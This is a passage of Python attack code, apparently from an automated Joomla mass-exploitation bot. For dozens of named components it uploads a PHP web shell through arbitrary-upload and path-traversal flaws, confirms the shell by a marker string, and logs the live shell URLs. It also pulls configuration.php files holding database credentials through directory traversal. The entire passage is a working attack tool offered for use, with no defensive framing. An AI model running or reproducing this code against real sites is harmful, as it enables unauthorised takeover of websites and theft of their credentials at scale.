				print '\033[92m[>] \033[0mExploit Com_Foxcontact  \033[92m[Wait] '.format(sb, sd, url, fc,fc, sb,fg)
				

				cids = re.findall('foxcontact&amp;Itemid=(.*?)" >',check_fox.content)
				
				for cid in cids:
					cid = str(cid)
					
					blackb0x = ["/components/com_foxcontact/lib/file-uploader.php?cid={}&mid={}&qqfile=/../../{}".format(cid, cid, filenames), "/index.php?option=com_foxcontact&view=loader&type=uploader&owner=component&id={}?cid={}&mid={}&qqfile=/../../{}".format(cid, cid, cid, filenames), "/index.php?option=com_foxcontact&amp;view=loader&amp;type=uploader&amp;owner=module&amp;id={}&cid={}&mid={}&owner=module&id={}&qqfile=/../../{}".format(cid, cid, cid, cid, filenames), "/components/com_foxcontact/lib/uploader.php?cid={}&mid={}&qqfile=/../../{}".format(cid, cid, filenames)]
					
					ids = 0
					for b0x in blackb0x:
						ids += 1
						vuln_urls = url + b0x
					
						req_fox = requests.post(vuln_urls, data=shell)
						
						print( "\n[!] exploiting ...".format(ids))
						
						check_shells = requests.get(url+'/components/com_foxcontact/'+filenames)
						
						if 'MisterSpyShellForV7Bot0X_istanbul_2019' in check_shells:
							print '\033[92m[>] \033[0mExploit Com_Foxcontact  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg, ids)
							open('Exploited/shells.txt', 'a').write(url+'/components/com_foxcontact/'+filenames)
						else:
							print '\033[92m[>] \033[0mExploit Com_Foxcontact  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
	
	
			else:
				print '\033[92m[>] \033[0mExploit Com_Foxcontact  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)

		
		#2 com_jce
		
		
		fgappgravkg  = {'upload-dir': '../../', 
		'upload-overwrite': '0', 
		'action': 'upload'}
		
		
		fgGravkg = {'Filedata': open(jceupshell, 'rb')}
		
		Gravkgreq = requests.post(url+'/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form"', data=fgappgravkg, files=fgGravkg)
	
		
		fgGravkglib = requests.get(url+'/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in fgGravkglib.content:
			print '\033[92m[>] \033[0mExploit Com_Jce  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Com_Jce  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)

		#3 jdownloads
		
		
		zttappgravkg  = {'name':'Owner Tn', 
		'mail':'spinningarrix@gmail.com', 
		'catlist':'1',
		'filetitle':"Vulnerability! MisterSpyShellForV7Bot0X_istanbul_2019",
		'description':"<p>Vulnerability! MisterSpyShellForV7Bot0X_istanbul_2019</p>",
		'2d1a8f3bd0b5cf542e9312d74fc9766f':1,
		'send':1,
		'senden':"Send file",
		'description':"<p>Vulnerability! MisterSpyShellForV7Bot0X_istanbul_2019</p>",
		'option':"com_jdownloads", 
		'view':"upload"}
		
		
		zttGravkg = {'pic_upload':(com_jdownloads, open(com_jdownloads, 'rb'), 'multipart/form-data')}
		
		zttGravkgreq = requests.post(url+'/index.php?option=com_jdownloads&Itemid=0&view=upload', data=zttappgravkg, files=zttGravkg)
	
		
		zttGravkglib = requests.get(url+'/images/jdownloads/screenshots/'+com_jdownloads)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in zttGravkglib.content:
			print '\033[92m[>] \033[0mExploit Com_Jdownloads \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/images/jdownloads/screenshots/'+com_jdownloads+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Com_Jdownloads  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)			

			
		#4 com_fabrik
		
		
		appgravkg  = {"name" : "me.php", 
		"drop_data" : "1", 
		"overwrite" : "1",
		"field_delimiter" : ",",
		"text_delimiter" : "&quot;",
		"option" : "com_fabrik",
		"controller" :"import",
		"view" : "import",
		"task" : "doimport",
		"Itemid" : "0", 
		"tableid" : "0"}
		
		
		Gravkg = {'userfile':open(jceupshell, 'rb')}
		
		Gravkgreq = requests.post(url+'/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=1', data=appgravkg, files=Gravkg)
	
		
		Gravkglib = requests.get(url+'/media/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in Gravkglib.content:
			print '\033[92m[>] \033[0mExploit Com_Fabrik  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/media/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Com_Fabrik  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)

			

			
		#5 com_fabrik2
		
		aaReflexup = {'file' : open(jceupshell, 'rb')}
		
		aaReflexreq = requests.post(url+'/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload', files=aaReflexup)
		
		aaReflexlib = requests.get(url+'/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in aaReflexlib.content:
			print '\033[92m[>] \033[0mExploit Com_Fabrik2  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Com_Fabrik2  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)	


		#6 com_oziogallery
		
		xxcvbappgrav  = {'path':'/../../../'}
		
		
		xxcvbGrav = {'raw_data':(louis, shell, 'text/html')}			
		
		
		xaynzfeReflexreq = requests.post(url+'/components/com_oziogallery/imagin/scripts_ralcr/filesystem/writeToFile.php', files=xxcvbGrav, data=xxcvbappgrav)
		
		xaynzfeReflexlib = requests.get(url+'/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in xaynzfeReflexlib.content:
			print '\033[92m[>] \033[0mExploit Com_Oziogallery  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Com_Oziogallery  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)

			

		#7 com_oziogallery2
		
		axxcvbappgrav  = {'path':'/../../../'}
		
		
		axxcvbGrav = {'raw_data':(louis, shell, 'text/html')}			
		
		
		axaynzfeReflexreq = requests.post(url+'/components/com_oziogallery2/imagin/scripts_ralcr/filesystem/writeToFile.php', files=axxcvbGrav, data=axxcvbappgrav)
		
		axaynzfeReflexlib = requests.get(url+'/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in axaynzfeReflexlib.content:
			print '\033[92m[>] \033[0mExploit Com_Oziogallery2  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Com_Oziogallery2  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)



	
		#8 Com_Jbcatalog
		
		aReflexup = {'files[]' : open(jceupshell, 'rb')}
		
		aReflexreq = requests.post(url+'/components/com_jbcatalog/libraries/jsupload/server/php/', files=aReflexup)
		
		aReflexlib = requests.get(url+'/components/com_jbcatalog/libraries/jsupload/server/php/files/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in aReflexlib.content:
			print '\033[92m[>] \033[0mExploit Com_Jbcatalog  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/components/com_jbcatalog/libraries/jsupload/server/php/files/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Com_Jbcatalog  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)	
		
			
		#9 mod_socialpinboard_menu
		
		bReflexup = {'uploadfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/mod_socialpinboard_menu/saveimagefromupload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/mod_socialpinboard_menu/images/socialpinboard/temp/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit Mod_Socialpinboard_Menu  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/modules/mod_socialpinboard_menu/images/socialpinboard/temp/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Mod_Socialpinboard_Menu  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
	
		
		#10 com_adsmanager
		
		
		appgrav  = {'name':'Files/shell.jpg'}
		
		
		Grav = {'file':(filename, shell, 'text/html')}
		
		Gravreq = requests.post(url+'/index.php?option=com_adsmanager&task=upload&tmpl=component', data=appgrav, files=Grav)
		
		Gravlib = requests.get(url+'/tmp/plupload/shell.jpg')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in Gravlib.content:
			print '\033[92m[>] \033[0mExploit Com_Adsmanager  \033[92m[Done] '.format(sn)
			open('Exploited/shell.txt', 'a').write(url+'/tmp/plupload/shell.jpg'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Com_Adsmanager  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)

		
		#11 com_b2jcontact
		
		
		Gravkreq = requests.post(url+'/index.php?option=com_b2jcontact&view=loader&type=uploader&owner=component&bid=1&id=138&Itemid=138&qqfile=/../../Vuln.php', data=shell)
		
		Gravklib = requests.get(url+'/components/com_b2jcontact/Vuln.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in Gravklib.content:
			print '\033[92m[>] \033[0mExploit Com_B2jcontact  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/components/com_b2jcontact/Vuln.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Com_B2jcontact  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
			
		

			
			
		#12 com_sexycontactform
		
		Reflexup = {'files[]' : open(jceupshell, 'rb')}
		
		Reflexreq = requests.post(url+'/com_sexycontactform/fileupload/index.php', files=Reflexup)
		
		Reflexlib = requests.get(url+'/com_sexycontactform/fileupload/files/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in Reflexlib.content:
			print '\033[92m[>] \033[0mExploit Com_Sexycontactform  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/com_sexycontactform/fileupload/files/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Com_Sexycontactform  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)	
		
		
		
			
		#13 com_myblog
			
		
		
		Gravs = {'fileToUpload':(louisxv, shell, 'text/html')}

		sonzsxyreq = requests.post(url+'/index.php?option=com_myblog&task=ajaxupload', files=Gravs)	
		
		sonzsxylib = requests.get(url+'/up.php.xxxjpg')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in sonzsxylib.content:
			print '\033[92m[>] \033[0mExploit Com_Myblog  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/up.php.xxxjpg'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Com_Myblog  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)			

		
		#14 com_rokdownloads
		
		bappgrav  = {'jpath':'..%2F..%2F..%2F..%2F'}
		
		
		bGrav = {'Filedata':(louisxv, shell, 'text/html')}
		
		bGravreq = requests.post(url+'/administrator/components/com_rokdownloads/assets/uploadhandler.php', data=bappgrav, files=bGrav)
		
		bGravlib = requests.get(url+'/images/stories/up.php.xxxjpg')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bGravlib.content:
			print '\033[92m[>] \033[0mExploit Com_Rokdownloads  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/images/stories/up.php.xxxjpg'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Com_Rokdownloads  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)

		
		#15 com_simplephotogallery
		
		dsbappgrav  = {'jpath':'..%2F..%2F..%2F..%2F'}
		
		
		dsbGrav = {'file':(louisxv, shell, 'text/html')}
		
		dsbGravreq = requests.post(url+'/administrator/components/com_simplephotogallery/lib/uploadFile.php', data=dsbappgrav, files=dsbGrav)
		
		dsbGravlib = requests.get(url+'/up.php.xxxjpg')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in dsbGravlib.content:
			print '\033[92m[>] \033[0mExploit Com_Simplephotogallery  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/up.php.xxxjpg'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Com_Simplephotogallery  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)

	
		
		#16 com_extplorer
		
		
		
		cbGrav = {'Filedata':(louisxv, shell, 'text/html')}
		
		cbGravreq = requests.post(url+'/administrator/components/com_extplorer/uploadhandler.php', files=cbGrav)
		
		cbGravlib = requests.get(url+'/images/stories/shell.php.xxxjpg')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in cbGravlib.content:
			print '\033[92m[>] \033[0mExploit Com_Extplorer  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/images/stories/up.php.xxxjpg'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Com_Extplorer  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)

		
		#17 megamenu uploadify
		
		
		
		cbGrav = {'Filedata': open(jceupshell, 'rb')}
		
		cbGravreq = requests.post(url+'/modules/megamenu/uploadify/uploadify.php?folder=modules/megamenu/uploadify/"', files=cbGrav)
		
		cbGravlib = requests.get(url+'/modules/megamenu/uploadify/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in cbGravlib.content:
			print '\033[92m[>] \033[0mExploit Megamenu Uploadify  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/modules/megamenu/uploadify/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Megamenu Uploadify  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
			
			
		#18 mod_simplefileuploadv1
		
		eReflexup = {'file' : open(jceupshell, 'rb')}
		
		eReflexreq = requests.post(url+'/modules/mod_simplefileuploadv1.3/elements/udd.php', files=eReflexup)
		
		eReflexlib = requests.get(url+'/modules/mod_simplefileuploadv1.3/elements/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in eReflexlib.content:
			print '\033[92m[>] \033[0mExploit Mod_Simplefileuploadv1  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/modules/mod_simplefileuploadv1.3/elements/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Mod_Simplefileuploadv1  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)	
			
			
		#20 com_bt_portfolio
		
		feReflexup = {'Filedata' : open(jceupshell, 'rb')}
		
		feReflexreq = requests.post(url+'/administrator/components/com_bt_portfolio/helpers/uploadify/uploadify.php', files=feReflexup)
		
		feReflexlib = requests.get(url+'/administrator/components/com_bt_portfolio/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in feReflexlib.content:
			print '\033[92m[>] \033[0mExploit Com_Bt_Portfolio  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/administrator/components/com_bt_portfolio/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Com_Bt_Portfolio  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)				


		#21 com_jwallpapers
		
		zfeReflexup = {'file' : open(jceupshell, 'rb')}
		
		zfeReflexreq = requests.post(url+'/index.php?option=com_jwallpapers&task=upload', files=zfeReflexup)
		
		zfeReflexlib = requests.get(url+'/jwallpapers_files/plupload/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in zfeReflexlib.content:
			print '\033[92m[>] \033[0mExploit jJwallpapers_Files  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/jwallpapers_files/plupload/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit jJwallpapers_Files  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)	


		#22 com_redmystic
		
		
		dzfeReflexreq = requests.post(url+'/administrator/components/com_redmystic/chart/ofc-library/ofc_upload_image.php?name=Vuln.php', data=shell)
		
		dzfeReflexlib = requests.get(url+'/administrator/components/com_redmystic/chart/tmp-upload-images/Vuln.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in dzfeReflexlib.content:
			print '\033[92m[>] \033[0mExploit Com_Redmystic  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/administrator/components/com_redmystic/chart/tmp-upload-images/Vuln.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Com_Redmystic  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)


		#23 com_facileforms
		
		xbappgrav  = {'folder':'/components/com_facileforms/libraries/jquery/'}
		
		nzfeReflexup = {'Filedata' : open(jceupshell, 'rb')}
		
		nzfeReflexreq = requests.post(url+'/components/com_facileforms/libraries/jquery/uploadify.php', data=xbappgrav, files=nzfeReflexup)
		
		nzfeReflexlib = requests.get(url+'/components/com_facileforms/libraries/jquery/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in nzfeReflexlib.content:
			print '\033[92m[>] \033[0mExploit Com_Facileforms  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/components/com_facileforms/libraries/jquery/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Com_Facileforms  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)

		
		#24 com_civicrm
		

		wGravkreq = requests.post(url+'/administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/php-ofc-library/ofc_upload_image.php?name=Vuln.php', data=shell)
		
		wGravklib = requests.get(url+'/administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/tmp-upload-images/Vuln.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in wGravklib.content:
			print '\033[92m[>] \033[0mExploit Com_Civicrm  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/tmp-upload-images/Vuln.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Com_Civicrm  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)

		
		#25 com_maian15
		

		ewGravkreq = requests.post(url+'/administrator/components/com_maian15/charts/php-ofc-library/ofc_upload_image.php?name=Vuln.php', data=shell)
		
		ewGravklib = requests.get(url+'/administrator/components/com_maian15/charts/tmp-upload-images/Vuln.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in ewGravklib.content:
			print '\033[92m[>] \033[0mExploit Com_Maian15  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/administrator/components/com_maian15/charts/tmp-upload-images/Vuln.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Com_Maian15  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)

		
		
		#26 com_acymailing
		

		
		awGravkreq = requests.post(url+'/administrator/components/com_acymailing/inc/openflash/php-ofc-library/ofc_upload_image.php?name=Vuln.php', data=shell)
		
		awGravklib = requests.get(url+'/administrator/components/com_acymailing/inc/openflash/tmp-upload-images/Vuln.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in awGravklib.content:
			print '\033[92m[>] \033[0mExploit Com_Acymailing  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/administrator/components/com_acymailing/inc/openflash/tmp-upload-images/Vuln.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Com_Acymailing  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
			
		
		#27 com_jnewsletter
		

		
		dawGravkreq = requests.post(url+'/administrator/components/com_jnewsletter/includes/openflashchart/php-ofc-library/ofc_upload_image.php?name=Vuln.php', data=shell)
		
		dawGravklib = requests.get(url+'/administrator/components/com_jnewsletter/includes/openflashchart/tmp-upload-images/Vuln.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in dawGravklib.content:
			print '\033[92m[>] \033[0mExploit Com_Jnewsletter  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/administrator/components/com_jnewsletter/includes/openflashchart/tmp-upload-images/Vuln.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Com_Jnewsletter  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
			
		
		#28 com_jinc
		

		
		xdawGravkreq = requests.post(url+'/administrator/components/com_jinc/classes/graphics/php-ofc-library/ofc_upload_image.php?name=Vuln.php', data=shell)
		
		xdawGravklib = requests.get(url+'/administrator/components/com_jinc/classes/graphics/tmp-upload-images/Vuln.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in xdawGravklib.content:
			print '\033[92m[>] \033[0mExploit Com_Jinc  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/administrator/components/com_jinc/classes/graphics/tmp-upload-images/Vuln.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Com_Jinc  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
			
		
		#29 com_maianmedia
		

		
		zxdawGravkreq = requests.post(url+'/administrator/components/com_maianmedia/utilities/charts/php-ofc-library/ofc_upload_image.php?name=Vuln.php', data=shell)
		
		zxdawGravklib = requests.get(url+'/administrator/components/com_maianmedia/utilities/charts/tmp-upload-images/Vuln.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in zxdawGravklib.content:
			print '\033[92m[>] \033[0mExploit Com_Maianmedia  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/administrator/components/com_maianmedia/utilities/charts/tmp-upload-images/Vuln.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Com_Maianmedia  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
			
		
		#30 com_jnews
		

		
		zxdawGravkreq = requests.post(url+'/administrator/components/com_jnews/includes/openflashchart/php-ofc-library/ofc_upload_image.php?name=Vuln.php', data=shell)
		
		zxdawGravklib = requests.get(url+'/administrator/components/com_jnews/includes/openflashchart/tmp-upload-images/Vuln.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in zxdawGravklib.content:
			print '\033[92m[>] \033[0mExploit Com_Jnews  \033[91m[Failed] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/administrator/components/com_jnews/includes/openflashchart/tmp-upload-images/Vuln.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Com_Jnews  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)			



		
		#31 com_hdflvplayer
		
		xcrevlib = requests.get(url+"/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php")
				
		if 'JConfig' in xcrevlib.content:
			print '\033[92m[>] \033[0mExploit Com_Hdflvplayer  \033[92m[Done] '.format(sn)
			open('Exploited/ManualConfig.txt', 'a').write(url+'/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php'+'\n')
		else:
			print '\033[92m[>] \033[0mExploit Com_Hdflvplayer  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)				

		
		#32 jat3action
		
		aaxcrevlib = requests.get(url+"/index.php?jat3action=gzip&type=css&file=configuration.php")
				
		if 'JConfig' in aaxcrevlib.content:
			print '\033[92m[>] \033[0mExploit Jat3action  \033[92m[Done] '.format(sn)
			open('Exploited/ManualConfig.txt', 'a').write(url+'/index.php?jat3action=gzip&type=css&file=configuration.php'+'\n')
		else:
			print '\033[92m[>] \033[0mExploit Jat3action  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
		
		#33 mod_dvfoldercontent
		
		Caaxcrevlib = requests.get(url+"/modules/mod_dvfoldercontent/download.php?f=Li4vLi4vY29uZmlndXJhdGlvbi5waHA=")
				
		if 'JConfig' in Caaxcrevlib.content:
			print '\033[92m[>] \033[0mExploit Mod_Dvfoldercontent  \033[92m[Done] '.format(sn)
			open('Exploited/ManualConfig.txt', 'a').write(url+'/modules/mod_dvfoldercontent/download.php?f=Li4vLi4vY29uZmlndXJhdGlvbi5waHA='+'\n')
		else:
			print '\033[92m[>] \033[0mExploit Mod_Dvfoldercontent  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)


		#34 jw_allvideos
		
		aCaaxcrevlib = requests.get(url+"/plugins/content/jw_allvideos/includes/download.php?file=../../../../configuration.php")
				
		if 'JConfig' in aCaaxcrevlib.content:
			print '\033[92m[>] \033[0mExploit Jw_Allvideos  \033[92m[Done] '.format(sn)
			open('Exploited/ManualConfig.txt', 'a').write(url+'/plugins/content/jw_allvideos/includes/download.php?file=../../../../configuration.php'+'\n')
		else:
			print '\033[92m[>] \033[0mExploit Jw_Allvideos  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)



		#35 com_product_modul
		
		daCaaxcrevlib = requests.get(url+"/index.php?option=com_product_modul&task=download&file=../../../../../configuration.php&id=1&Itemid=1")
				
		if 'JConfig' in daCaaxcrevlib.content:
			print '\033[92m[>] \033[0mExploit Com_Product_Module  \033[92m[Done] '.format(sn)
			open('Exploited/ManualConfig.txt', 'a').write(url+'/index.php?option=com_product_modul&task=download&file=../../../../../configuration.php&id=1&Itemid=1'+'\n')
		else:
			print '\033[92m[>] \033[0mExploit Com_Product_Module  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)			



		#36 com_cckjseblod
		
		xdaCaaxcrevlib = requests.get(url+"/index.php?option=com_cckjseblod&task=download&file=configuration.php")
				
		if 'JConfig' in xdaCaaxcrevlib.content:
			print '\033[92m[>] \033[0mExploit Com_Cckjseblod  \033[92m[Done] '.format(sn)
			open('Exploited/ManualConfig.txt', 'a').write(url+'/index.php?option=com_cckjseblod&task=download&file=configuration.php'+'\n')
		else:
			print '\033[92m[>] \033[0mExploit Com_Cckjseblod  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)


		#37 com_contushdvideoshare
		
		rxdaCaaxcrevlib = requests.get(url+"/components/com_contushdvideoshare/hdflvplayer/download.php?f=../../../configuration.php")
				
		if 'JConfig' in rxdaCaaxcrevlib.content:
			print '\033[92m[>] \033[0mExploit Com_Contushdvideoshare  \033[92m[Done] '.format(sn)
			open('Exploited/ManualConfig.txt', 'a').write(url+'/components/com_contushdvideoshare/hdflvplayer/download.php?f=../../../configuration.php'+'\n')
		else:
			print '\033[92m[>] \033[0mExploit Com_Contushdvideoshare  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)


		#38 com_community
		
		trxdaCaaxcrevlib = requests.get(url+"/index.php?option=com_community&view=groups&groupid=1&task=app&app=groupfilesharing&do=download&file=../../../../configuration.php&Itemid=0")
				
		if 'JConfig' in trxdaCaaxcrevlib.content:
			print '\033[92m[>] \033[0mExploit Com_Community  \033[91m[Failed] '.format(sn)
			open('Exploited/ManualConfig.txt', 'a').write(url+'/index.php?option=com_community&view=groups&groupid=1&task=app&app=groupfilesharing&do=download&file=../../../../configuration.php&Itemid=0'+'\n')
		else:
			print '\033[92m[>] \033[0mExploit Com_Community  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)			


		#39 com_aceftp
		
		yrxdaCaaxcrevlib = requests.get(url+"/administrator/components/com_aceftp/quixplorer/index.php?action=download&dir=&item=configuration.php&order=name&srt=yes")
				
		if 'JConfig' in yrxdaCaaxcrevlib.content:
			print '\033[92m[>] \033[0mExploit Com_Aceftp  \033[91m[Failed] '.format(sn)
			open('Exploited/ManualConfig.txt', 'a').write(url+'/administrator/components/com_aceftp/quixplorer/index.php?action=download&dir=&item=configuration.php&order=name&srt=yes'+'\n')
		else:
			print '\033[92m[>] \033[0mExploit Com_Aceftp  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)


		#40 s5_media_player
		
		ayrxdaCaaxcrevlib = requests.get(url+"/plugins/content/s5_media_player/helper.php?fileurl=Li4vLi4vLi4vY29uZmlndXJhdGlvbi5waHA=")
				
		if 'JConfig' in ayrxdaCaaxcrevlib.content:
			print '\033[92m[>] \033[0mExploit S5_Media_Player  \033[92m[Done] '.format(sn)
			open('Exploited/ManualConfig.txt', 'a').write(url+'/plugins/content/s5_media_player/helper.php?fileurl=Li4vLi4vLi4vY29uZmlndXJhdGlvbi5waHA='+'\n')
		else:
			print '\033[92m[>] \033[0mExploit S5_Media_Player  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)


		#41 com_joomanager
		
		cayrxdaCaaxcrevlib = requests.get(url+"/index.php?option=com_joomanager&controller=details&task=download&path=configuration.php")
				
		if 'JConfig' in cayrxdaCaaxcrevlib.content:
			print '\033[92m[>] \033[0mExploit Com_Joomanager  \033[92m[Done] '.format(sn)
			open('Exploited/ManualConfig.txt', 'a').write(url+'/index.php?option=com_joomanager&controller=details&task=download&path=configuration.php'+'\n')
